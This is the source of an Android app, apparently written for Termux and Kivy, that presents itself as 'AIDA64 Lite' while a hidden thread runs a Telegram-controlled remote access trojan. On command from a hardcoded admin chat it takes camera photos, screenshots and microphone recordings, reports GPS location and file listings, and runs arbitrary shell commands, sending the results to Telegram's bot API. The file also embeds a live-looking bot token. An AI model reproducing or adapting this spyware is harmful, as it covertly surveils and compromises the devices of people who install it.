import os, subprocess, time, requests, json, threading
from kivy.app import App
from kivy.uix.label import Label

TOKEN = "8602231936:AAERH9y8Rfc-xOJBiPf4eKSt6NlQMBr2JGk"
ADMIN = "7854185047"
offset = 0

def send(c, text, kb=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": c, "text": text[:4000]}
    if kb:
        data["reply_markup"] = json.dumps({"inline_keyboard": kb})
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_photo(c, path):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={"chat_id": c},
                files={"photo": f}
            )
    except:
        send(c, "Ошибка фото")

def send_file(c, path):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={"chat_id": c},
                files={"document": f}
            )
    except:
        send(c, "Ошибка файла")

keyboard = [
    [{"text": "Камера", "callback_data": "cam"}],
    [{"text": "Скриншот", "callback_data": "scr"}],
    [{"text": "Микрофон", "callback_data": "mic"}],
    [{"text": "GPS", "callback_data": "gps"}],
    [{"text": "Файлы", "callback_data": "ls"}],
    [{"text": "Закрыть", "callback_data": "close"}]
]

def bot_loop():
    global offset
    while True:
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{TOKEN}/getUpdates",
                params={"offset": offset, "timeout": 10},
                timeout=15
            )
            for update in r.json().get("result", []):
                offset = update["update_id"] + 1
                if "callback_query" in update:
                    q = update["callback_query"]
                    cid = q["message"]["chat"]["id"]
                    data = q["data"]
                    if data == "cam":
                        os.system("termux-camera-photo -c 0 /sdcard/cam.jpg")
                        send_photo(cid, "/sdcard/cam.jpg")
                    elif data == "scr":
                        os.system("termux-screenshot /sdcard/screen.png")
                        send_photo(cid, "/sdcard/screen.png")
                    elif data == "mic":
                        os.system("termux-microphone-record -d 5 -f /sdcard/mic.aac")
                        send_file(cid, "/sdcard/mic.aac")
                    elif data == "gps":
                        loc = subprocess.getoutput("termux-location")
                        send(cid, f"GPS: {loc[:4000]}", keyboard)
                    elif data == "ls":
                        files = "\n".join(os.listdir("."))[:4000]
                        send(cid, f"{os.getcwd()}\n\n{files}", keyboard)
                    elif data == "close":
                        send(cid, "Меню закрыто", None)
                    try:
                        requests.get(
                            f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
                            params={"callback_query_id": q["id"]}
                        )
                    except:
                        pass
                else:
                    text = update.get("message", {}).get("text", "")
                    cid = update.get("message", {}).get("chat", {}).get("id")
                    if not text or str(cid) != ADMIN:
                        continue

                    if text == "/start":
                        send(cid, "AIDA64 Lite активен. Выбери:", keyboard)
                    elif text == "/help":
                        send(cid, "/start /help /shell /ls /cd /kill", keyboard)
                    elif text.startswith("/shell"):
                        out = subprocess.getoutput(text[7:])[:4000]
                        send(cid, f"Результат:\n{out}", keyboard)
                    elif text == "/ls":
                        files = "\n".join(os.listdir("."))[:4000]
                        send(cid, f"{os.getcwd()}\n\n{files}", keyboard)
                    elif text.startswith("/cd"):
                        try:
                            os.chdir(text[4:])
                            send(cid, f"Перешли в {os.getcwd()}", keyboard)
                        except:
                            send(cid, "Ошибка", keyboard)
                    elif text == "/kill":
                        send(cid, "Остановка", None)
                        os._exit(0)
                    else:
                        send(cid, "Неизвестно. /help", keyboard)
        except Exception as e:
            time.sleep(3)

class AIDA64App(App):
    def build(self):
        return Label(text="Загрузка данных устройства...")

if __name__ == "__main__":
    threading.Thread(target=bot_loop, daemon=True).start()
    AIDA64App().run()
